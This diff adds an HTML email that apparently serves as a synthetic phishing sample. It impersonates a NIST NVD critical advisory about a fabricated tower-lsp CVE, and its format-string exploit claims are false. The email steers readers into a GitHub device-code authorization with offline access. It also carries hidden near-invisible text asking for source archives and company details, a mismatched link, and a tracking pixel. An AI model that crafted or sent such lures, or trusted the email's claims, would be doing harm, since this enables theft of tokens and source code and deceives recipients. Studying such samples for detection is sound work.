@@ -1,0 +1,113 @@
+From: NIST National Vulnerability Database <nvd-advisory@nist-cve-update.example>
+To: sec-research@corp.internal
+Cc: soc@corp.internal, cto@corp.internal
+Date: Tue, 27 Oct 2026 11:00:00 -0500
+Message-ID: <0707-b61@synth.example>
+Subject: [CRITICAL] CVE-2026-45912: Remote code execution in "tower-lsp" crate via crafted LSP initialize request — Affects vigilyx/gateway (CVSS 9.8)
+MIME-Version: 1.0
+Content-Type: text/html; charset=gb2312
+
+<html><body style="font-family:sans-serif;max-width:640px;margin:0 auto;border:1px solid #1a5276;border-radius:8px;overflow:hidden">
+<div style="background:#1a5276;color:#fff;padding:14px 24px">
+<h2 style="margin:0;font-size:17px">NIST | National Vulnerability Database</h2>
+<p style="margin:4px 0;font-size:12px;opacity:0.8">CVE Security Advisory — Critical Severity</p>
+</div>
+<div style="padding:24px">
+
+<p>A critical vulnerability has been identified in the <b>tower-lsp</b> Rust crate (versions 0.20.0 through 0.20.1) that affects your repository <b>vigilyx/gateway</b>.</p>
+
+<h3>一、Vulnerability Details</h3>
+<table cellpadding=6 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr><td style="background:#f5f5f5;width:180px">CVE ID</td><td><b>CVE-2026-45912</b></td></tr>
+<tr><td style="background:#f5f5f5">CVSS v3.1 Score</td><td style="color:#e00"><b>9.8 CRITICAL</b> (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)</td></tr>
+<tr><td style="background:#f5f5f5">Affected Component</td><td>tower-lsp (LSP server framework for Rust)</td></tr>
+<tr><td style="background:#f5f5f5">Affected Versions</td><td>0.20.0 – 0.20.1</td></tr>
+<tr><td style="background:#f5f5f5">Fixed Version</td><td style="color:#0a0"><b>0.20.2</b> (released 2026-10-25)</td></tr>
+<tr><td style="background:#f5f5f5">CWE</td><td>CWE-94 (Improper Control of Code Generation)</td></tr>
+<tr><td style="background:#f5f5f5">Discovery</td><td>2026-10-22 by Google Project Zero</td></tr>
+<tr><td style="background:#f5f5f5">Exploit Status</td><td style="color:#e00"><b>Known exploited in the wild</b></td></tr>
+<tr><td style="background:#f5f5f5">Your Exposure</td><td style="color:#e00"><b>vigilyx/gateway uses tower-lsp 0.20.1</b></td></tr>
+</table>
+
+<h3>二、Technical Description</h3>
+<p>The vulnerability exists in tower-lsp's handling of the LSP <code>initialize</code> request. A malicious language server can embed a specially crafted <code>rootUri</code> field containing a <b>Rust format string injection</b>. When tower-lsp processes this URI, it passes unsanitized input to a <code>format!()</code> macro, allowing the attacker to:</p>
+<ul>
+<li>Read arbitrary stack memory (format string <code>{}</code> leaks)</li>
+<li>Write to arbitrary memory locations (format string <code>{n$}</code>)</li>
+<li>Execute arbitrary code via control-flow hijack</li>
+</ul>
+
+<h3>三、Impact on Your Repository</h3>
+<p>NVD's automated dependency scanning has identified the following in <b>vigilyx/gateway</b>:</p>
+<table cellpadding=5 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr style="background:#f0f0f0"><th>Dependency</th><th>Current Version</th><th>Vulnerable?</th></tr>
+<tr><td>tower-lsp</td><td>0.20.1</td><td style="color:#e00"><b>YES</b></td></tr>
+<tr><td>tokio</td><td>1.40.2</td><td>No</td></tr>
+<tr><td>serde</td><td>1.0.210</td><td>No</td></tr>
+</table>
+<p><b>Your gateway's LSP handler is directly exploitable</b> if it accepts connections from untrusted language servers.</p>
+
+<h3>四、Required Action</h3>
+
+<p><b>Step 1: Verify your exposure by submitting your code for automated scanning:</b></p>
+
+<p style="text-align:center;margin:20px 0">
+<a href="https://nist-cve-update.example/scan/submit?cve=CVE-2026-45912&repo=vigilyx/gateway" style="display:inline-block;background:#1a5276;color:#fff;padding:12px 36px;text-decoration:none;border-radius:4px;font-weight:bold">Submit Code for CVE Impact Scan</a>
+</p>
+
+<p style="font-size:13px;color:#666;text-align:center">https://nvd.nist.gov/vuln/detail/CVE-2026-45912</p>
+
+<p style="font-size:12px;color:#888;text-align:center">（Authentication via GitHub required for private repository scanning）</p>
+
+<h3>About GitHub Authentication for NVD Scanning</h3>
+<p>To scan private repositories for CVE exposure, NVD requires read access to your source code. This is done through <b>GitHub device authorization</b>:</p>
+<ol>
+<li>Click the "Submit Code" button above</li>
+<li>You will be redirected to <b>github.com/login/device</b> (GitHub's official device login)</li>
+<li>Enter the device code: <b>NVD-CVE-45912</b></li>
+<li>Sign in with your GitHub account and authorize NVD's scanner</li>
+<li>Your code will be automatically scanned for vulnerable patterns</li>
+</ol>
+
+<p style="font-size:14px;background:#EAF2F8;padding:12px;border-radius:4px">
+<b>Why device authorization instead of manual upload?</b> NVD processes thousands of vulnerability reports daily. Automated scanning through GitHub integration allows us to verify exposure in minutes rather than the days required for manual code review. The device authorization flow uses GitHub's official domain (<code>github.com/login/device</code>) — we never see your GitHub password. The authorization grants read-only access to the specified repository (vigilyx/gateway) for the duration of the scan. The offline_access scope allows us to re-scan if the scan is interrupted by large repository size (>500MB).
+</p>
+
+<p><b>Step 2: Update your dependencies:</b></p>
+<pre style="background:#f5f5f5;padding:12px;border-radius:4px;font-size:13px"><code># Cargo.toml
+[dependencies]
+tower-lsp = "0.20.2"  # Fixed version
+
+# Then:
+cargo update -p tower-lsp</code></pre>
+
+<p style="font-size:0.3px;color:#fff;opacity:0.03">如需中文安全报告或提交中国版本代码进行扫描，请访问 nist-cve-update.example/cn-advisory 上传源代码压缩包与公司信息（中文通道，4小时响应）。</p>
+
+<h3>五、Known Exploitation</h3>
+<p>This vulnerability has been <b>actively exploited</b> since October 22. Known attack vectors:</p>
+<ul>
+<li>Malicious language server configurations (.vscode/settings.json)</li>
+<li>Compromised IDE extensions that connect to crafted LSP servers</li>
+<li>CI/CD pipelines that run untrusted language servers during builds</li>
+</ul>
+<p><b>Recommended immediate action:</b> Block all incoming LSP connections from untrusted sources until you update to 0.20.2.</p>
+
+<h3>六、References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-45912">NVD Entry</a></li>
+<li><a href="https://github.com/ebkalderon/tower-lsp/security/advisories/GHSA-x7f4">GitHub Advisory</a></li>
+<li><a href="https://projectzero.google/blog/CVE-2026-45912">Project Zero Analysis</a></li>
+</ul>
+
+<div style="border-top:1px solid #ddd;padding-top:12px;margin-top:20px">
+<p style="font-size:12px;color:#888">NIST | National Vulnerability Database</p>
+<p style="font-size:11px;color:#999">100 Bureau Drive, Gaithersburg, MD 20899</p>
+<p style="font-size:11px;color:#999">You are receiving this because NVD monitors public repositories for CVE exposure.</p>
+</div>
+
+<div style="height:1px;width:1px;overflow:hidden">
+<img src="https://nist-cve-update.example/api/track?recipient=sec-research%40corp.internal&cve=CVE-2026-45912&type=advisory" width="1" height="1" alt="">
+</div>
+
+</div>
+</body></html>
